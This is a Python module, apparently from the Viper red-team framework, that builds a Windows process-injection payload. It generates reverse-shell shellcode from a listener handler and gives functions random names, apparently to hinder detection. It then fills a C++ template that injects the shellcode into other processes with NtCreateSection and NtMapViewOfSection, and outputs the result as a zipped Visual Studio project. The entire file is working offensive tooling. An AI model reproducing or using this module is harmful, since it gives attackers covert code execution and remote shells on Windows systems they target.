# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "NtCreateSection进程注入"
    DESC_ZH = "使用NtCreateSection及NtMapViewOfSection远程线程注入技术打开共享内存,将shellcode注入到其他进程中"

    NAME_EN = "NtCreateSection process injection"
    DESC_EN = "Use NtCreateSection and NtMapViewOfSection remote thread injection technology to open shared memory and inject shellcode into other processes"
    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/hncv58"]
    REFERENCES = ["https://idiotc4t.com/code-and-dll-process-injection/untitled"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        FUNCTION = self.random_str(8)
        FUNCTION1 = self.random_str(9)
        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
                                                        FUNCTION1=FUNCTION1)

        filename = f"NtCreateSection_{int(time.time())}.zip"
        self.write_zip_vs_project(filename, source_code, )

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的源码: {filename}", f"Please check the generated source code in <Files>: {filename}")
